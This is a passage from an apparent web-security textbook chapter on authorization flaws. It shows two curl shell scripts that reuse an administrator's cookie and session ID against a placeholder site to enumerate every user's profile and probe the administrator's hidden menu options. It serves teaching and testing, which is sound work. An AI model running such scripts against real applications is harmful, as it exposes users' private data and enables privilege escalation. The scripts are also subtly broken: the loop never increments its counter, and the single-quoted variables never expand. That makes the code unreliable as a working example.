# Chapter 6: Authorization

file.in this scenario, user IDs 1001, 19293, and 43000 were able to view our profile—nwe've found three administrators!

Next, we'll use the second script to enumerate all of the active user IDs by sequentially checking profiles. This time we use the UserID static value and increment the profilefile value. We'll use the User ID of 19293 for the administrator:

```
#!/bin/sh
PROFILE=1
while [ $PROFILE -le 100000 ]; do
echo -e "$PROFILE ******\n" >> results.txt
curl -G \
  -H 'Cookie: uid=19293; sessid=99834948209' \
  -d 'menu=4' \
  -d 'userid=19293' \
  -d 'profile=$PROFILE' \
  -d 'r=874bace2' \
--url https://www.victim.com/ >> results.txt
echo -e "*********\n" >> results.txt
UserID=$(expr $PROFILE + 1)
done
exit
```

Once this script has finished running, we have enumerated the profile information for every active user in the application.

After taking another look at the URL's parameters (menu=4&userID=24601&profile=24601&874bace2), a third attack comes to mind. So far we've accessed the application as a low-privilege user. That is, our ID number, 24601, has access to a limited number of menu options. On the other hand, it is likely that the administrator, user ID number 19293, has more menu options available. We can't log in as the administrator because we don't have user's password, but we've only been presented with options of the application intended for low-privilege users.

The third attack is simple. We'll modify the curl script and enumerate the menu values for the application. Since we don't know what the values will be, we'll create the script so it accepts a menu number from the command line and prints the server's response to the screen:

```
#!/bin/sh
# guess menu options with curl: guess.sh
curl -v -G \
  -H 'Cookie: uid=19293; sessid=99834948209' \
  -d 'menu=$1' \
  -d 'userID=19293' \
  -d 'r=874bace2' \
--url https://www.victim.com/
```